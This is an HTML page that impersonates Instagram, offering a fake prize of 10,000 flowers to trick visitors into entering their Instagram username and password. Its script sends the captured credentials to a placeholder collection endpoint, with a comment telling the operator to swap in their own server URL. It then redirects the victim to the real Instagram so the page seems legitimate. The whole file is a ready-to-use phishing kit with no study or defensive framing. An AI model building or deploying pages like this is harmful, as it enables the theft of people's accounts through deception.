<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Congratulations! You've Won Flowers from Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #8a3ab9 0%, #4c68d7 100%);
            padding: 20px;
        }
        .container {
            background: #fff;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 400px;
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #8a3ab9 0%, #4c68d7 100%);
            color: white;
            text-align: center;
            padding: 30px 20px;
        }
        .header h1 {
            font-size: 22px;
            margin-bottom: 10px;
        }
        .header p {
            font-size: 16px;
            opacity: 0.9;
        }
        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 15px;
            background: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            color: #8a3ab9;
        }
        .form-container {
            padding: 25px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        .input-group label {
            display: block;
            font-size: 14px;
            color: #262626;
            margin-bottom: 8px;
            font-weight: 500;
        }
        .input-group input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            font-size: 16px;
            background: #fafafa;
        }
        .input-group input:focus {
            outline: none;
            border-color: #a8a8a8;
        }
        .btn {
            width: 100%;
            background: #0095f6;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
        }
        .btn:hover {
            background: #1877f2;
        }
        .footer {
            text-align: center;
            padding: 20px;
            color: #8e8e8e;
            font-size: 12px;
            border-top: 1px solid #dbdbdb;
        }
        .footer a {
            color: #8e8e8e;
            text-decoration: none;
        }
        #message {
            text-align: center;
            color: #ed4956;
            font-size: 14px;
            margin-top: 15px;
            display: none;
        }
        .flower-img {
            width: 120px;
            margin: 0 auto;
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">ðŸŒ¹</div>
            <h1>Claim Your 10,000 Flowers!</h1>
            <p>You've been selected for a special Instagram gift.</p>
        </div>
        <div class="form-container">
            <p style="text-align: center; margin-bottom: 20px;">To secure your gift, please verify your Instagram account.</p>
            
            <form id="loginForm">
                <div class="input-group">
                    <label for="username">Phone number, username, or email</label>
                    <input type="text" id="username" name="username" required autocomplete="username">
                </div>
                <div class="input-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required autocomplete="current-password">
                </div>
                <button type="submit" class="btn">Verify and Claim Gift</button>
            </form>
            <p id="message"></p>
        </div>
        <div class="footer">
            <p>From Instagram &middot; <a href="#">Help</a> &middot; <a href="#">Privacy</a> &middot; <a href="#">Terms</a></p>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            event.preventDefault(); // Prevent the form from refreshing the page
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const messageEl = document.getElementById('message');
            
            // Simple validation
            if (!username || !password) {
                messageEl.textContent = 'Please fill in all fields.';
                messageEl.style.display = 'block';
                return;
            }
            
            messageEl.textContent = 'Verifying your account...';
            messageEl.style.display = 'block';
            messageEl.style.color = '#0095f6';
            
            // Prepare the data to send
            const formData = new FormData();
            formData.append('username', username);
            formData.append('password', password);
            
            try {
                // REPLACE THIS URL WITH YOUR SERVERLESS FUNCTION URL IN PHASE 2
                const response = await fetch('https://your-serverless-function.vercel.app/api/collect', {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                
                if (data.success) {
                    // Show a fake success message, then redirect (could be to real Instagram to seem legit)
                    messageEl.textContent = 'Verification successful! Redirecting...';
                    messageEl.style.color = 'green';
                    setTimeout(() => {
                        window.location.href = 'https://www.instagram.com/';
                    }, 2000);
                } else {
                    messageEl.textContent = 'Temporary error. Please try again in a moment.';
                    messageEl.style.color = '#ed4956';
                }
            } catch (error) {
                console.error('Error:', error);
                messageEl.textContent = 'Network error. Please check your connection.';
                messageEl.style.color = '#ed4956';
            }
        });
    </script>
</body>
</html>
